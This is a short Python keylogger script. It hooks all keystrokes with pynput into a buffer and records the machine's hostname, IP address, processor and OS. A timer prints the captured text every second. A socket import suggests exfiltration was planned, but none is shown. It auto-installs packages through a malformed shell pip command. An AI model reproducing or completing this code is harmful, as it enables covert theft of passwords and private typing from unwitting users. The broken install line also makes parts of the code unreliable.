import sys
import os

if sys.version_info.major >= 3:
    try:
        import subprocess
        
        from pynput import keyboard
        import socket
        import platform
        import threading
        data = ''

    except ModuleNotFoundError:
        packages = ["keyboard","pynput"]
        for package in packages:
            subprocess.call("python3 -m pip install -r" + ' '.join(package), shell=True)
            
        

    finally:
        USER_HOSTNAME = socket.gethostname()
        USER_IP = socket.gethostbyname(USER_HOSTNAME)
        USER_PROCESSOR = platform.processor()
        USER_SYSTEM = platform.system()
        USER_MACHINE = platform.machine()
        USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
        
        def return_data():
            send_data_interval = threading.Timer(1, return_data)
            print(data)
            send_data_interval.start()
            
            
        def on_press(key):
            global data
            if key == keyboard.Key.space:
                data += " "
            elif key == keyboard.Key.enter:
                data += "\n"
            elif key == keyboard.Key.tab:
                data += "\t"
            elif key == keyboard.Key.backspace:
                data = data[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                data += " _CTRL_ "
            elif key == keyboard.Key.caps_lock:
                data += " _CAPS_ " #Requires rework to detect caps on or off and covert string.
            else:
                data += str(key).strip("'")
                
            
            

        with keyboard.Listener(on_press=on_press) as listener:
            return_data()
            listener.join()  

else:
    os._exit(0)
    

